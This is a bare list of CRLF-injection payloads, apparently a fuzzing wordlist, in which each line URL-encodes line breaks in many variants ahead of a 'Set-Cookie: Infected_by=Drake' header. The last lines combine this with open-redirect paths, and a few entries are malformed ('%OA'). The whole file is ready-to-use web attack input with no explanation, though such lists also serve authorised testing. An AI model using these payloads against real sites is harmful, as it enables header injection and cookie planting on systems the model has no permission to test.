%0ASet-Cookie: Infected_by=Drake
%0A%20Set-Cookie: Infected_by=Drake
%20%0ASet-Cookie: Infected_by=Drake
%23%OASet-Cookie: Infected_by=Drake
%E5%98%8A%E5%98%8DSet-Cookie: Infected_by=Drake
%E5%98%8A%E5%98%8D%0ASet-Cookie: Infected_by=Drake
%3F%0ASet-Cookie: Infected_by=Drake
crlf%0ASet-Cookie: Infected_by=Drake
crlf%0A%20Set-Cookie: Infected_by=Drake
crlf%20%0ASet-Cookie: Infected_by=Drake
crlf%23%OASet-Cookie: Infected_by=Drake
crlf%E5%98%8A%E5%98%8DSet-Cookie: Infected_by=Drake
crlf%E5%98%8A%E5%98%8D%0ASet-Cookie: Infected_by=Drake
crlf%3F%0ASet-Cookie: Infected_by=Drake
%0DSet-Cookie: Infected_by=Drake
%0D%20Set-Cookie: Infected_by=Drake
%20%0DSet-Cookie: Infected_by=Drake
%23%0DSet-Cookie: Infected_by=Drake
%E5%98%8A%E5%98%8DSet-Cookie: Infected_by=Drake
%E5%98%8A%E5%98%8D%0DSet-Cookie: Infected_by=Drake
%3F%0DSet-Cookie: Infected_by=Drake
crlf%0DSet-Cookie: Infected_by=Drake
crlf%0D%20Set-Cookie: Infected_by=Drake
crlf%20%0DSet-Cookie: Infected_by=Drake
crlf%23%0DSet-Cookie: Infected_by=Drake
crlf%E5%98%8A%E5%98%8DSet-Cookie: Infected_by=Drake
crlf%E5%98%8A%E5%98%8D%0DSet-Cookie: Infected_by=Drake
crlf%3F%0DSet-Cookie: Infected_by=Drake
%0D%0ASet-Cookie: Infected_by=Drake
%0D%0A%20Set-Cookie: Infected_by=Drake
%20%0D%0ASet-Cookie: Infected_by=Drake
%23%0D%0ASet-Cookie: Infected_by=Drake
%E5%98%8A%E5%98%8DSet-Cookie: Infected_by=Drake
%E5%98%8A%E5%98%8D%0D%0ASet-Cookie: Infected_by=Drake
%3F%0D%0ASet-Cookie: Infected_by=Drake
crlf%0D%0ASet-Cookie: Infected_by=Drake
crlf%0D%0A%20Set-Cookie: Infected_by=Drake
crlf%20%0D%0ASet-Cookie: Infected_by=Drake
crlf%23%0D%0ASet-Cookie: Infected_by=Drake
crlf%E5%98%8A%E5%98%8DSet-Cookie: Infected_by=Drake
crlf%E5%98%8A%E5%98%8D%0D%0ASet-Cookie: Infected_by=Drake
crlf%3F%0D%0ASet-Cookie: Infected_by=Drake
%0D%0A%09Set-Cookie: Infected_by=Drake
crlf%0D%0A%09Set-Cookie: Infected_by=Drake
%250ASet-Cookie: Infected_by=Drake
%25250ASet-Cookie: Infected_by=Drake
%%0A0ASet-Cookie: Infected_by=Drake
%25%30ASet-Cookie: Infected_by=Drake
%25%30%61Set-Cookie: Infected_by=Drake
%u000ASet-Cookie: Infected_by=Drake
//www.google.com/%2F%2E%2E%0D%0ASet-Cookie: Infected_by=Drake
/www.google.com/%2E%2E%2F%0D%0ASet-Cookie: Infected_by=Drake
/google.com/%2F..%0D%0ASet-Cookie: Infected_by=Drake
